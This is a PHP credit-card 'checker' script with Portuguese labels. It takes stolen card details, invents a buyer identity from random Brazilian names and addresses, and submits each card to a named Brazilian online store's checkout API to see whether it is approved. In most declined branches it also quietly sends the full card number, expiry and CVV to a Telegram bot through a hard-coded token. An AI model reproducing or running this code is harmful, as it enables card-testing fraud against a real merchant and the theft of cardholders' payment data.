<?php
$time = time();

    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];
    function puxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
    }
$bin1 = substr($cc, 0, 6); 
$file = 'bins.csv'; 
$searchfor = $bin1; 
$contents = file_get_contents($file); 
$pattern = preg_quote($searchfor, '/'); 
$pattern = "/^.*$pattern.*\$/m"; 
if (preg_match_all($pattern, $contents, $matches)) { 
    $encontrada = implode("\n", $matches[0]); 
}
$pieces = explode(";", $encontrada); 
$c = count($pieces);
if ($c == 8) { 
    $pais = $pieces[4]; 
    $paiscode = $pieces[5]; 
    $banco = $pieces[2]; 
    $level = $pieces[3]; 
    $bandeira = $pieces[1]; 
} else { 
    $pais = $pieces[5]; 
    $paiscode = $pieces[6]; 
    $link = $pieces[7]; 
    $level = $pieces[4]; 
    $banco = $pieces[2]; 
    $bandeira = $pieces[1]; 
}


if (file_exists(getcwd()."/cookies.txt")) {
        unlink(getcwd()."/cookies.txt");
    }


// ========================================  CONTAR QUANTOS DIGITOS TEM A CC  ========================================

$contador_cc = strlen($lista);

if ($contador_cc < 6) {
    echo json_encode(array("status" => 1, "str" => "<font class=\"label label-danger\">#Invalido</font> | $lista | <b>Vai se foder otaku.. ! </b><br>"));
    return;
}

// ========================================  CONTAR QUANTOS DIGITOS TEM A CC  ========================================



// ========================================  ARRAYS RANDOMS..  ========================================

$cep = rand(100,900);

$nomes = array("José", "Fernando", "Roberto", "Marcelo", "João", "John", "Kleiton", "Marcos", "Rogerio", "Jhon", "Flavio", "Renato");
$nome_pessoa = $nomes[array_rand($nomes)];

$sobrenomes = array("Silva", "Silas", "Souza", "Santos", "Neto", "Lobato", "Santos", "Almeida", "Albuquerque", "Dantas", "Raia");
$sobrenome_pessoa = $sobrenomes[array_rand($sobrenomes)];

$telefone = array("11996452030", "17996458520", "15981569021", "16997261414", "11991457785", "17996412563", "12991920020", "11996452030");
$generator_tel = $telefone[array_rand($telefone)];

$cidade = array("Americo de Campos", "Votuporanga", "Mirassol", "Baddy Bassit", "Populina", "Nhandeara", "Tanabi", "Macaubal", "Riolandia");
$generator_cidade = $cidade[array_rand($cidade)];

$endereco = array("Av. Jucelino Kubishek", "Angelino dantas", "Antonio Binni", "Frederico Raia", "Rua das Palmeiras", "Sebastiao rodrigues sobrinho");
$generator_adress = $endereco[array_rand($endereco)];

$numero_casa = array("434", "543", "554", "123", "113", "345", "567", "678", "964", "1245", "386", "444");
$generator_nmrcasa = $numero_casa[array_rand($numero_casa)];

$complemento = array("Casa", "Apartamento", "Condominio");
$local_casa = $complemento[array_rand($complemento)];

$bairro = array("Jardim Alvorada", "Boa vista", "Capao redondo", "Campo das flores", "Clube dos 40", "Mattarazo", "Colinas");
$setar_bairro = $bairro[array_rand($bairro)];


// ========================================  ARRAYS RANDOMS..  ========================================


$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, "https://www.lojadopaulo.com.br/rest/default/V1/carts/mine/payment-information");
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'accept: */*',
'content-type: application/json',
'cookie: mage-cache-storage=%7B%7D; mage-cache-storage-section-invalidation=%7B%7D; mage-messages=; recently_viewed_product=%7B%7D; recently_viewed_product_previous=%7B%7D; recently_compared_product=%7B%7D; recently_compared_product_previous=%7B%7D; product_data_storage=%7B%7D; __cf_bm=pNsRhr6RakNS9xzfcBb4EzZRoIZ6aSrWiNxIOLGydRM-1658109822-0-AdzFjrFj9vw1obL+/VPzgb9/IA8wTrSi1P7jhK+hi++5HDqMvmhZGw3MaTD/xHlPRrbYhbi0TZmIv4T1c9WexaOk/otoz4dD5zSqD/aO7CA0LgE/SJGgHbrgG9+SqjtgdQ==; PHPSESSID=i9p7rgpv6gk0f0cubl42h96r05; X-Magento-Vary=9bf9a599123e6402b85cde67144717a08b817412; form_key=PbmzVL5lIlmp8cEF; mage-cache-sessid=true; private_content_version=8611a8ee36f354d80d45f8819cb36130; section_data_ids=%7B%22customer%22%3A1658109826%2C%22compare-products%22%3A1658109826%2C%22last-ordered-items%22%3A1658109826%2C%22cart%22%3A1658109853%2C%22directory-data%22%3A1658109826%2C%22captcha%22%3A1658109826%2C%22instant-purchase%22%3A1658109826%2C%22persistent%22%3A1658109826%2C%22review%22%3A1658109826%2C%22wishlist%22%3A1658109826%2C%22recently_viewed_product%22%3A1658109826%2C%22recently_compared_product%22%3A1658109826%2C%22product_data_storage%22%3A1658109826%2C%22paypal-billing-agreement%22%3A1658109826%2C%22messages%22%3A1658109887%7D',
'origin: https://www.lojadopaulo.com.br',
'referer: https://www.lojadopaulo.com.br/checkout/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.74',
'x-requested-with: XMLHttpRequest'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, '{"cartId":"30038","billingAddress":{"customerAddressId":"2402","countryId":"BR","regionId":"508","regionCode":"SP","region":"São Paulo","customerId":"32938","street":["'.$generator_adress.'","'.$generator_nmrcasa.'","'.$setar_bairro.'","'.$local_casa.'"],"company":null,"telephone":"'.$generator_tel.'","fax":"'.$generator_tel.'","postcode":"'.$cep.'","city":"'.$generator_cidade.'","firstname":"'.$nome_pessoa.'","lastname":"'.$sobrenome_pessoa.'","middlename":null,"prefix":null,"suffix":null,"vatId":null,"customAttributes":[],"extension_attributes":{},"saveInAddressBook":null},"paymentMethod":{"method":"az2009_cielo","additional_data":{"cc_type":"VI","cc_number":"'.$cc.'","cc_name":"'.$nome_pessoa.' '.$sobrenome_pessoa.'","cc_exp_month":"'.$mes.'","cc_exp_year":"'.$ano.'","cc_cid":"'.$cvv.'","cc_token":"new","cc_installments":1}}}');
echo $meupiru = curl_exec($ini);
//$id_do_carai = puxar($exec, '"id": "', '"');


$retorno = puxar($meupiru, '"message":"','"');
$livezinha = puxar($meupiru, '"','"');



if(strpos($meupiru, "Pagamento n\u00e3o autorizado")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "Nem todos os seus produtos est\u00e3o dispon\u00edveis na quantidade solicitada.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "A quantidade solicitada n\u00e3o est\u00e1 dispon\u00edvel")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "Um erro no servidor impediu que seu pedido fosse colocado. Por favor, tente fazer seu pedido novamente.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "Cart\u00e3o de Cr\u00e9dito Inv\u00e1lido")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "Inv\u00e1lida Data de Expira\u00e7\u00e3o do Cart\u00e3o de Cr\u00e9dito")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "N\u00e3o foi poss\u00edvel salvar o endere\u00e7o. Verifique o endere\u00e7o e tente novamente.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "Internal Error. Details are available in Magento log file.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "O endere\u00e7o de envio est\u00e1 vazio. Adicione o endere\u00e7o e tente novamente.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> Configure o produto no cart da loja novamente..! » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

elseif(strpos($meupiru, "O cliente atual n\u00e3o tem um carrinho ativo.")!== false){

    echo "<span class='badge badge-danger'>#Reprovada</span> ❌ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> $retorno » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

    $botoken = "5489114857:AAGAQTxpaGwaq9_zijyPQh6lEp_6-c6J8qs";
    $data = ['text' => "DB => $cc|$mes|$ano|$cvv",'chat_id' => '1040924962', 'parse_mode' => 'html'];
    file_get_contents("https://api.telegram.org/bot$botoken/sendMessage?" . http_build_query($data));

}

else{

    echo "<span class='badge badge-success'>#Aprovada</span> ✔ $cc|$mes|$ano|$cvv - $bandeira - $banco - $level - $pais » <span class='badge badge-info'>Retorno:</span> Transação autorizada. - Código ID: $livezinha » <span class='badge badge-warning'>Tempo de resposta:</span> ".(time() - $time)." s <br>";

}

?>